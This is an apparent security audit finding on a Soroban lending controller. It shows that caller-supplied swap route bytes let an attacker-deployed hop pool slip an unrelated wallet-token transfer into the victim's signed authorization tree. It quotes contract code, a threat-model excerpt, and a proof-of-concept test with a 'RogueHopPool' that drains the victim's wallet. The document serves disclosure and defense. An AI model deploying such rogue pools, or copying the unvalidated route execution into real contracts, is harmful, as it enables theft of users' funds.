### Title
Caller-controlled route bytes can execute unauthorized wallet token transfers - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The controller forwards attacker-supplied serialized route bytes to the configured swap aggregator without decoding, constraining, or validating the route-selected contracts that may run below the caller’s authorization. A malicious route can place attacker-controlled contract code on the call stack and request unrelated token transfers from the caller; if the caller signs the simulation-generated authorization tree, those transfers execute. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_tokens` snapshots balances, authorizes only the controller’s exact input transfer, then calls `execute_strategy` with the caller-provided `swap` bytes. The measured output and overspend checks only constrain the controller’s token balances; they do not identify all authorization requests made by code reached through the serialized route. [3](#0-2) 

The reachable entrypoints include `swap_collateral`, `swap_debt`, `multiply`, and `repay_debt_with_collateral`, each of which accepts a `swap: Bytes` argument from its caller. [4](#0-3) [5](#0-4) 

The harness demonstrates a malicious payload that names an attacker-deployed hop pool. During routing, that pool calls `transfer(victim, attacker, amount)` on an unrelated wallet token; Soroban records the theft as a child of the victim’s `swap_collateral` authorization. [6](#0-5) [7](#0-6) 

### Impact Explanation
This enables theft of caller funds outside the assets and amounts declared by the lending strategy. The protocol can still receive a valid swap output and pass its controller-side balance checks while the malicious route transfers any unrelated wallet token listed in the signed authorization tree. [8](#0-7) 

### Likelihood Explanation
An unprivileged user can submit arbitrary route bytes to a public strategy entrypoint. Exploitation requires the user to sign the expanded authorization tree rather than the expected honest tree; therefore, the practical attack depends on tricking a wallet or caller into accepting simulation output containing an extra child transfer. The codebase’s threat model documents that honest simulation records such a transfer under the caller’s authorization entry. [9](#0-8) 

### Recommendation
Constrain route execution so deserialized route data cannot introduce arbitrary contract calls beneath the caller’s authorization. At minimum, the router should enforce a governance-maintained venue allowlist for pool addresses embedded in routes. Clients should also reject any `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` authorization tree containing children other than the expected strategy/token interactions. [9](#0-8) 

### Proof of Concept
The repository includes a reproduction using `swap_collateral`:

1. Deploy a router double whose `execute_strategy` deserializes `swap_xdr` into a route containing an arbitrary `hop_pool`, invokes that pool, and returns a fair output. [10](#0-9) 
2. Deploy a malicious `hop_pool` whose `swap` function calls `token.transfer(victim, attacker, amount)`. [11](#0-10) 
3. Encode the malicious pool address in the `swap` argument and call `Controller.swap_collateral(caller, account_id, USDC, amount, ETH, route)`. [12](#0-11) 
4. Simulation records the unrelated wallet-token transfer as a child of the caller’s `swap_collateral` authorization; signing that tree authorizes the transfer. [7](#0-6) 
5. The test ends with the victim’s unrelated wallet balance at zero, the attacker receiving `WALLET_BALANCE`, and the controller crediting the expected fair ETH output. [8](#0-7)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L29-48)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-47)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-157)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }

    fn assets(&self) -> (HubAssetKey, HubAssetKey) {
        (
            hub_asset(self.t.resolve_asset("USDC")),
            hub_asset(self.t.resolve_asset("ETH")),
        )
    }

    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** contracts/controller/src/lib.rs (L255-302)
```rust
    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
    }

    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/lib.rs (L310-333)
```rust
    #[when_not_paused]
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
    ) {
        strategies::repay_debt_with_collateral::process_repay_debt_with_collateral(
            &env,
            &caller,
            RepayWithCollateralParams {
                account_id,
                collateral: &collateral,
                collateral_amount,
                debt: &debt,
                swap: &swap,
                close_position,
            },
        );
    }
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```
